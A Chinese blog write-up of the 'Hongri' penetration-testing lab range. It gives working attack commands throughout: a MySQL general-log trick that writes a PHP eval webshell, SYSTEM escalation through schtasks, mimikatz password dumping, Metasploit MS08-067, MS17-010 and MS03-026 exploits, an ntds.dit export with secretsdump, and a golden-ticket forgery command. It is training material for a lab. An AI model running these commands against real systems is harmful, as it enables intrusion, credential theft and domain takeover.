---
title: 红日靶场（1）：内网与域渗透实战笔记
date: 2026-10-10 16:00:00
categories:
  - 内网渗透
tags:
  - 红日靶场
  - 内网渗透
  - 域渗透
  - CobaltStrike
  - 永恒之蓝
  - 黄金票据

---

web服务器：win7

域成员：win2003

域控DC：win2008

![](/img/posts/hongri-range-1/hongri-range-1-01.png)

## 攻击流程
### 1.web漏洞
nmap扫描端口

![](/img/posts/hongri-range-1/hongri-range-1-02.png)

只发现了80、3306端口

大概要从数据库入手，mysql

dirsearch扫描目录

![](/img/posts/hongri-range-1/hongri-range-1-03.png)

/phpinfo.php 信息泄露

/phpMyAdmin/ 数据库管理后台暴露

/ChangeLog和/README 版本和文档信息泄露

基本确定从数据库提权

访问80端口

phpStudy 2014的版本，绝对路径是 C:/phpStudy/WWW

![](/img/posts/hongri-range-1/hongri-range-1-04.png)

这个版本的经典默认账号密码是：

用户名：root

密码：root

![](/img/posts/hongri-range-1/hongri-range-1-05.png)

测试成功连接

![](/img/posts/hongri-range-1/hongri-range-1-06.png)

去 /phpMyAdmin 登录

![](/img/posts/hongri-range-1/hongri-range-1-07.png)

#### getshell：全局日志拿shell
利用 MySQL 的日志功能（General Log），我们可以强行把日志文件的名字改成 .php 后缀，然后把木马“写”进日志里。

1.开启全局日志功能：SET global general_log = "ON";

![](/img/posts/hongri-range-1/hongri-range-1-08.png)

2.修改日志文件的绝对路径：我们要把日志生成到 phpStudy 的网站根目录下

SET global general_log_file = "C:/phpStudy/WWW/shell.php";

![](/img/posts/hongri-range-1/hongri-range-1-09.png)

3.将木马写入日志文件：随意一句SQL查询就会被记录进日志文件

SELECT '<?php @eval($_POST["cmd"]);?>';

![](/img/posts/hongri-range-1/hongri-range-1-10.png)

使用蚁剑连接

![](/img/posts/hongri-range-1/hongri-range-1-11.png)

成功登入

### ps：用CS连接 
[https://meiyitou.top/index.php/2024/04/21/cobaltstrike4-0%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7cs%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/](https://meiyitou.top/index.php/2024/04/21/cobaltstrike4-0%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7cs%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/)

#### 信息收集
![](/img/posts/hongri-range-1/hongri-range-1-12.png)

进行一下提权，win7上的账号有UAC拦着，但是本身也是管理员权限，可以申请让系统内核本身去运行这个attack.exe，成功后cs上出现了system权限

在蚁剑终端执行： 

schtasks /create /tn "cyber_system" /tr "C:\phpStudy\WWW\attack.exe" /sc once /st 23:59 /ru "NT AUTHORITY\SYSTEM"  

 schtasks /run /tn "cyber_system"  

用system执行：logonpasswords

获得账号密码

![](/img/posts/hongri-range-1/hongri-range-1-13.png)

确定域存在：shell net view /domain

![](/img/posts/hongri-range-1/hongri-range-1-14.png)

网络探测（确认域控地址）：net view

![](/img/posts/hongri-range-1/hongri-range-1-15.png)

两个主机，这样已经可以看出哪个是域控了，但是还是谨慎的：shell net group "domain controllers" /domain

![](/img/posts/hongri-range-1/hongri-range-1-16.png)

OWA 对应的 192.168.52.138 是域控的地址。

对域控的端口进行扫描：portscan 192.168.52.0/24 1-1024,3389 arp 1024

![](/img/posts/hongri-range-1/hongri-range-1-17.png)

#### Jump利用（第一种思路）
两个主机的445端口都开着，利用CS的Jump-psexec解决

### 2.继续内网信息收集
net view

看到的域成员的系统内核版本是5.2，它只属于：

+ **Windows Server 2003**
+ Windows Server 2003 R2
+ Windows XP 64位版本

OWA的内核版本是6.1，类型PDC: Windows Server 2008 R2 域控制器  

#### 2003版本的经典漏洞： MS08-067 / ms17_010
在kali种启动 msf ： proxychains4 msfconsole -q

![](/img/posts/hongri-range-1/hongri-range-1-18.png)

exp：use auxiliary/admin/smb/ms17_010_command

 这个command在目标的内核里以 `SYSTEM` 权限强行拉起一个本地进程，可以设置它来执行命令

关闭 Windows Server 2003 本地防火墙服务：set COMMAND net stop sharedaccess

run一下

![](/img/posts/hongri-range-1/hongri-range-1-19.png)

载入漏洞exp：use exploit/windows/smb/ms08_067_netapi  

![](/img/posts/hongri-range-1/hongri-range-1-20.png)

设置目标：set RHOSTS 192.168.52.141

配置回连载荷：set PAYLOAD windows/meterpreter/bind_tcp

设置目标版本：show targets

![](/img/posts/hongri-range-1/hongri-range-1-21.png)

更改目标：set TARGET X

开轰：exploit

![](/img/posts/hongri-range-1/hongri-range-1-22.png)

不过这里失败了，可能是之前的操作失误了

如果成功了，提示符就会变成 meterpreter >

就能执行命令了

#### 3.端口445-SMB口令猜测
主要是试着用 Hydra 爆破密码

然后用 proxychains4 测试连接

#### 4.Oracle数据库TNS服务漏洞
TNS协议：是 Oracle 数据库用于建立网络连接的底层协议，它由一个叫 Listener（监听器） 的核心组件来管理。通过端口1521传递数据。

通过kali，nmap一下端口号

![](/img/posts/hongri-range-1/hongri-range-1-23.png)

但是端口是 filtered（被过滤）大概率是被拦截的，直接pass掉

#### 5.RPC DCOM 服务漏洞（MS03-026）  
RPC的端口135是开放的

用msf打：

proxychains4 msfconsole -q

use exploit/windows/dcerpc/ms03_026_dcom

set RHOSTS 192.168.52.141

set PAYLOAD windows/meterpreter/bind_tcp

exploit

![](/img/posts/hongri-range-1/hongri-range-1-24.png)

+ **第一步：管道轰炸成功（完美击穿）**

Strict chain  ...  127.0.0.1:1090  ...  192.168.52.141:135  ...  OK

[*] 192.168.52.141:135 - Trying target Windows NT SP3-6a/2000/XP/2003 Universal...

这说明 2003 的 135 端口防火墙不仅大开，而且它底层的 RPC 核心组件**存在 MS03-026 漏洞！**

+ **第二步：Shellcode 强行夺权（无密执行）**

`[proxychains] ... 192.168.52.141:4444 ... OK`

成功执行了留在内存里的第一阶段代码（Egg Hunter/Shellcode），并且**在本地强行绕过了 Windows 防火墙，成功把 4444 端口给开起来了！** 你的 Kali 顺着代理，已经和 2003 的 4444 端口成功握手（`OK`）了！

+ **第三步：注水成功（Stage 已送达）**

`Sending stage (177734 bytes) to 192.168.52.141`

MSF 顺着这个缺口，把庞大的 Meterpreter 核心组件（Dll 载荷）整整齐齐地灌进了 2003 的 `svchost.exe` 进程内存里。

不过最后因不可控因素，失败了

### 3.域渗透
#### 1.信息收集
查所有域管理员：shell net group "domain admins" /domain

![](/img/posts/hongri-range-1/hongri-range-1-25.png)

查域内所有的计算机列表：shell net group "domain computers" /domain

![](/img/posts/hongri-range-1/hongri-range-1-26.png)

企业系统管理员：shell net group "enterprise admins" /domain

![](/img/posts/hongri-range-1/hongri-range-1-27.png)

#### 2.横向移动
jump-psexec利用



### 永恒之蓝的运用
拿krbtgt的Hash

经过多轮信息收集，不难发现域控对各端口的防火墙把控严密，但是它开放了445端口，直接使用kali的武器库msf打，

use auxiliary/admin/smb/ms17_010_command

set RHOSTS 192.168.52.138

set COMMAND cmd.exe /c "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\windows\temp\dh\" q q"（ IFM（Install From Media）离线导出域控数据库）

run

command执行成功后，备份下来的文件被放着c:\windows\temp\dh\文件夹下，利用SMB本身的运用，文件共享一下，因为之前一个永恒之蓝我们将域控的防火墙降级了，从win7下载这些文件。

copy \\192.168.52.138\c$\windows\temp\dh\registry\SYSTEM C:\SYSTEM

copy "\\192.168.52.138\c$\windows\temp\dh\Active Directory\ntds.dit" C:\ntds.dit

![](/img/posts/hongri-range-1/hongri-range-1-28.png)

用kali自带的工具 impacket-secretsdump 对下载的文件进行解析

impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

![](/img/posts/hongri-range-1/hongri-range-1-29.png)

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::

SID：whoami /user![](/img/posts/hongri-range-1/hongri-range-1-30.png)

伪造凭证材料：

1. 域名	Domain

2. 域的安全标识符	SID

3. 终极主密钥	krbtgt 账户的 NTLM Hash / RC4 Key

4. 伪造的目标用户名	User / ID

用： mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /rc4:58e91a5ac358d86513ab224312314061 /user:Administrator /id:500 /ptt 

伪造成功后，就拥有了黄金凭证

![](/img/posts/hongri-range-1/hongri-range-1-31.png)

### 在虚拟终端中信息收集
1.权限和身份：whoami

![](/img/posts/hongri-range-1/hongri-range-1-32.png)

不是system最高权限，需要提权

2.环境和防线：tasklist /v

查看有没有杀毒软件： 360tray.exe   HipsDaemon.exe（火绒）

![](/img/posts/hongri-range-1/hongri-range-1-33.png)

安全

3.系统：systeminfo

![](/img/posts/hongri-range-1/hongri-range-1-34.png)

硬件是64位的系统架构

![](/img/posts/hongri-range-1/hongri-range-1-35.png)

补丁情况暂时先放着

4.网卡和路由：ipconfig /all

![](/img/posts/hongri-range-1/hongri-range-1-36.png)

DNS后缀是 god.org

![](/img/posts/hongri-range-1/hongri-range-1-37.png)

![](/img/posts/hongri-range-1/hongri-range-1-38.png)

两个网卡 111.X 网段是连接外网的，那么这个52.X 就是内网了

5.邻居，最近和谁对话：arp -a

![](/img/posts/hongri-range-1/hongri-range-1-39.png)

出了两个 IP 很活跃，大概率是重要服务器

6. 判断域的身份： net config workstation

![](/img/posts/hongri-range-1/hongri-range-1-40.png)

是god.org说明在域中，如果是 WORKGROUP 就是普通的局域网工作组

7.定位域控（DC）：

 net group "domain controllers" /domain

![](/img/posts/hongri-range-1/hongri-range-1-41.png)

报错 错误5 拒绝访问，说明本地有UAC拦截

服务寻址，找LDAP服务：nslookup -type=SRV _ldap._tcp.god.org

![](/img/posts/hongri-range-1/hongri-range-1-42.png)

找到了 DC 的具体地址：192.168.52.138

8.内存和注册表：Mimikatz（没打补丁）

系统是64位的，在上面找到的

上传mimikatz.exe文件到 /phpStudy/WWW 目录下

在终端运行：mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

![](/img/posts/hongri-range-1/hongri-range-1-43.png)

拿到账号：Administrator 密码：hongrisec@2019
